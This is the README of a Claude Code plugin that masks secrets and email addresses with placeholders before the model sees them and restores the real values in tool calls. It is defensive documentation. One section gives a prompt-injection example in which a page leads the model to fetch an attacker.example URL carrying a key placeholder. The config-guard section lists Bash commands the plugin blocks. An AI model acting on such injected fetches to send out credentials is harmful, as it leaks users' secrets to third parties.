# redact

Swaps what your rules match for numbered placeholders before the model sees it, from the first request on, and puts the real values back where they run. No rule is on by default: your rules file starts with two examples, vendor tokens (`sk-`, `ghp_`, `AKIA`, `xoxb-`, JWTs and more) and email addresses, both off. Turn them on, add your own, give each its replacement label, and switch any rule on or off, from `/redact` or by editing the file. It is a pattern list, not a guarantee.

**Protects against**

- A secret or email address in your prompt, a file, a command's output, CLAUDE.md, a skill or a subagent's work reaching the model, and with it the provider.
- A failure in redact itself sending a value: what it can't mask is withheld (fails closed).

**Does not protect against**

- Real values leaving through a tool. Every tool gets them, WebFetch, WebSearch and MCP tools included, so a prompt injection or a placeholder echoed into a command sends the value out. See [What gets the real values](#what-gets-the-real-values).
- Model requests made after the restore: the permission check (in auto mode its classifier is a model), WebSearch's query, WebFetch's prompt to the model that reads the page.
- Anything at all until you turn a rule on or add one.
- Values no rule matches: an unusual format, an encoded or split value, one sent before a rule matched it.
- Images and documents, personal data other than emails, and other hooks, plugins or telemetry that see tool input.
- Someone set on turning it off: its guard on its own config is best effort. [HARDENING.md](HARDENING.md) closes more of it.

## Why

Secrets reach the model's context by many paths: a `cat .env`, an `env` dump, a `git diff`, a log line, an error message, your CLAUDE.md. Once there, they go to the model provider with every request, yet Claude often needs the value to run a command. redact is for anyone running Claude Code on a machine that holds real credentials.

Deny rules (`Read(.env)`) close one path, leave an `env` dump, a `git diff` and a log line open, and keep Claude from working with the file at all. gitleaks and other secret scanners check files and commits; they don't sit between a tool's output and the model. A DLP gateway masks requests on the wire, but needs a TLS-intercepting proxy, and the tool calls the model sends back hold placeholders your local tools can't run. redact runs inside Claude Code, where it sees both the request and the tool call, so it masks one and restores the other.

## Install

```
/plugin install redact --marketplace dboeter/cc-plugins
```

Answer `y` to add the marketplace, then pick a scope.

## How it works

- **Masked before the model sees it**: your prompt and a slash command's arguments, the first request's context (CLAUDE.md, your account's email, the date), the system prompt, the reminders and mentioned files Claude Code injects, a skill's text, an MCP tool's description, and every row the conversation keeps: tool results, a subagent's rows too. The model reads `GITHUB_TOKEN=⟦API_KEY_n⟧`.
- **Numbered**: each rule's replacement (`API_KEY`, `EMAIL`, a label of your own) labels its placeholders. Distinct values get distinct numbers. A value keeps its placeholder for the whole session, its subagents, retries and a `--resume`, and once matched, a value is masked wherever it comes back as a whole word, even where no rule would match it, and even after you turn its rule off: `hunter2` and a PIN too. The price: a word or number a rule misread stays masked for the rest of the session. A value with no letter or digit (`**`, `...`) is never masked. Rules run in file order, and only on the text between placeholders, so `\d+` never rewrites one's number.
- **Restored where it runs**: every tool call gets the real values back in its input before it runs, so a Write, an Edit or a Bash command works on the real value. The terminal draws the real values in the transcript, so the status line under the prompt counts what is masked (`redact: 4 masked`), and the pane can switch the terminal to draw the placeholders, as the model reads them.
- **Kept local**: the values and their placeholders sit in a vault per session in the plugin's store, never in a request.

## What gets the real values

Every tool, remote ones included: WebFetch, WebSearch, MCP tools. The restore is silent on purpose: redact keeps secrets out of the model, not out of your tools, so a command that needs a key gets it without a prompt. That has a price:

- **A placeholder in an outgoing call sends the real value.** One the model echoes into `gh pr create --body`, a commit message or a WebSearch query goes out as the value itself. To send the placeholder text instead, escape it (`⟦!API_KEY_n⟧`, see [What it refuses](#what-it-refuses)).
- **A prompt injection can send a value out.** A page or file that tells the model to fetch `https://attacker.example/?k=⟦API_KEY_n⟧` gets the real key sent there. The placeholder keeps a value from the model, not from the services the model calls.
- **The permission check sees the real values**, as it runs after the restore. In auto mode its classifier is a model request.
- **A tool's own model request**, where it makes one (WebSearch's query, WebFetch's prompt to the model that reads the page), carries the real value.

## Use

No `/redact` command enters the conversation: its line is dropped and its reply is a toast, so the model reads neither. `/redact` (or `/redact show`) opens a tabbed pane on **This session**; `/redact rules` (or `/redact test [text]`) opens it on **Rules**, and `/redact guide` (or `help`) on **Guide**. The top bar switches tabs (`s`, `r`, `h`), flags any skipped rules, and on the terminal shows what the terminal draws (`the real values` or `as the model reads it`) with a switch (`d`).

- **This session** lists each placeholder the vault holds, with its value (the length alone off the terminal), the rule that masked it, and a red ✗ that forgets it; with more than one, a red ✗ all drops them all. A value with a line break or over 40 characters (a private key) shows its first 6 and last 4 characters and its size until you press its ▸ (▾ hides it again). The model never reads the pane, and text read back off the screen (`tmux capture-pane` in a Bash call) comes back masked, as the vault holds every value the pane shows; a screenshot does not, as images are not masked. Forgetting drops the value from the vault: a tool call naming that placeholder is refused from then on, and the value, matched again, masks under a new number, never the old one.
- **Rules** starts with a **Test** section that previews on Enter (or via `/redact test <text>`) what the rules that are on mask in sample text without saving to the vault. Below it, **Rules** has an `add` field followed by the rules in your file, each by its number and name (or its pattern), the replacement it masks under, a switch that turns it on (`● on`) or off (`○ off`), and a red ✗ that removes it; a rule that does not read is marked skipped with the reason. Then **From settings** (where a pattern that does not read is marked skipped and named in the status line). On the mobile app, with no field, test and add from the prompt.
- **Guide** summarizes the rule format, placeholder escaping, and where real values go.

`/redact test <text>`, `/redact add <rule>`, `/redact remove <n|name>`, `/redact on <n|name>` and `/redact off <n|name>` work from the prompt, answered in a toast. A rule is named by its number in the file, its `name`, or its pattern; a number that names a rule is read as its number. Should a `/redact` line reach the conversation all the same, its arguments are emptied in every row the model is sent.

Your rules live in `~/.claude/redact-rules.json` (in `$CLAUDE_CONFIG_DIR` when that is set), one file for every project, on your machine only. redact creates it on first use holding the two examples, both off; it ships no other rules, and a later version's change to the examples does not reach a file already made. Edit the file by hand, or with `/redact add`, `remove`, `on` and `off`, which keep any other keys you put in it. It is read again before every masking, so an edit masks from the next message on, in every open session.

```json
{
  "rules": [
    { "name": "Acme keys", "pattern": "(?<=ACME_KEY=)\\S+", "replacement": "ACME_KEY", "enabled": true },
    { "name": "Employee ids", "pattern": "\\be\\d{6}\\b", "replacement": "EMPLOYEE_ID", "enabled": false, "ignoreCase": true, "min": 6 }
  ]
}
```

Each rule has:

- `pattern`: a JavaScript regex (backslashes doubled, as JSON wants). Each match is masked whole; a lookbehind keeps a prefix, and so does a group named `v` (or `v2`), which is all that is masked when it matched: `(?<pre>ACME_KEY=)(?<v>\S+)`.
- `replacement`: the label its placeholders take, capital letters, digits and `_`: `ACME_KEY` masks as `⟦ACME_KEY_n⟧`. Left out, it is `SECRET`.
- `enabled`: `false` turns the rule off. Left out, the rule is on: you wrote it to mask.
- `name`: what the pane, a toast and the vault call it. Optional.
- Options, all optional: `ignoreCase: true` matches whatever the case; `min: N` masks only a match of N characters or more, and not one of lowercase letters only; `strong: true` masks only a match of 8 or more characters of at least two kinds out of letters, digits and symbols; `prose: true` leaves an unquoted match right after a colon alone when words follow it on the line.

`/redact add` and the pane's `add` field take a rule as one line, `LABEL [options]: regex`, or a bare regex masked as `SECRET`, and add it on: `/redact add EMPLOYEE_ID i min=6: \be\d{6}\b`. The options there are `i`, `min=N`, `strong` and `prose`. A rule that does not read (no pattern, a replacement that is not a label, a regex that does not compile) is skipped and marked in the pane. A file that does not parse as JSON with a `rules` list is never written over: masking goes on with the last rules read (none, if it never parsed), and the status line says so until you fix it.

An older version kept your patterns in `~/.claude/redact-patterns.txt` and shipped seven built-in rules. On first use with no rules file, redact moves that file's patterns into the new one, each on and named by the comment above it, turns an example on where its built-in rule was on, and leaves the old file in place. A toast names the other built-in rules you had on (private keys, `Bearer` tokens, URL passwords, `--password` values, values assigned to a secret's name), which mask nothing now: add a rule of your own for any you still want.

More can be set in the `patterns` option, as one-line rules, always on and run after the file's; it is a list, so set it in settings.json (`/config` does not show list fields):

```json
"pluginConfigs": { "redact@dboeter": { "options": { "patterns": ["ACME_KEY: (?<=ACME_KEY=)\\S+"] } } }
```

## What it refuses

- **A placeholder it cannot restore**: a tool call naming a placeholder this session's vault does not hold (a number the model made up, one from another session, or a vault pruned or lost) is refused, rather than run with the placeholder in place of the value, and a toast tells you why. To write a placeholder as literal text (a doc, a PR body, a report about redact), put `!` after its opening bracket: `⟦!API_KEY_n⟧` with a real number is written as the placeholder itself, never looked up. In a README, write placeholders with a letter for the number (`⟦API_KEY_n⟧`), as this one does, or without the brackets.
- **Its own config** (off by default while redact is in development; the undeclared `guard: true` option turns it on): any call that reads or changes your rules file, a call that would change its store (the vaults), or its `enabledPlugins` and `pluginConfigs` entries in a settings file. A file tool is matched on where its path lands, so a link or another casing is caught, and a Grep over a folder that holds the rules file (`~/.claude`, your home folder) is refused. A Write or Edit of a settings file is compared before and after, so an edit that names only `"patterns"` is caught. Bash is matched as text: a command naming the rules file, a glob at the top of a `.claude` folder (`cat ~/.claude/*`), a recursive reader or copier (`grep -r`, `rg`, `find`, `tar`, `cp`) naming that folder, the store, or a `claude/settings*.json` path and `redact`. A bare `ls ~/.claude` passes. Reading the store through Bash is refused too; the pane lists your rules.
- **Its own failure**: when masking throws or outruns the hook's budget, what it masks is withheld: a row's text is replaced with a notice, a prompt is not sent, a command does not run, an injected reminder, a skill's text or an MCP tool's description is left out, the first request's context blocks are dropped, and the system prompt keeps only the sections that read the same for everyone. A toast tells you when context, system prompt sections or a reminder were left out. Nothing goes out unmasked.

## Limits

- **Shapes**: masking matches what your rules describe, so an encoded or split value (`base64`, `rev`) gets through, and so does any secret no rule that is on describes. A value first sent before any rule matched it stays in the rows that already carry it.
- **Images and documents**: Claude Code lets a plugin drop or move them, not change them, so a screenshot of a secret goes out as it is.
- **Other code that sees the real values**: settings hooks (PreToolUse and PostToolUse get a tool's input and output), other plugins' hooks and model calls, and telemetry that logs tool input.
- **Managed setups**: where an organization manages Claude Code, the hooks on skills' text, the first request's context, the system prompt and injected reminders run only for a plugin the organization lists in managed settings.
- **Where placeholders show**: every surface but the terminal keeps them (the mobile app over Remote Control, the desktop app, VS Code), so drawing never sends a value off the terminal, and the pane's draw switch is on the terminal only; so do collapsed tool groups, the prompt history, and the terminal while the pane's toggle draws it as the model reads it.
- **Context shifts**: a value is put back as it was captured. One taken from a JSON string, escapes and all, and written into a file of another format is written as captured.
- **Placeholder-shaped text**: text of a placeholder's shape that a file already holds reads as one when the vault holds its number, and is restored to that value on write. One the vault does not hold reads escaped, so writing it back gives the literal text. A file that already holds the escaped form loses its `!` on write.

## Harden it

Permission rules and a managed-settings entry hold where the plugin's own guard can't: see [HARDENING.md](HARDENING.md).

## What it does on your machine

- **Storage**: your rules in `~/.claude/redact-rules.json`; in the plugin's store, `~/.claude/plugins/store/redact_*.json`, a vault per session, holding that session's real values in plain text. A vault untouched for 30 days is dropped when a session starts; a `--resume` of that session then refuses its placeholders.
- **Files**: it reads a settings file that a Write or Edit is about to change, to compare its own entries before and after. It writes nothing but its store and your rules file, and reads `~/.claude/redact-patterns.txt` once, to move an older version's patterns. The transcript file keeps a tool's own record (what the terminal draws, a Read's file content say) as the tool made it; what the model is sent is masked.
- **Network**: nothing.
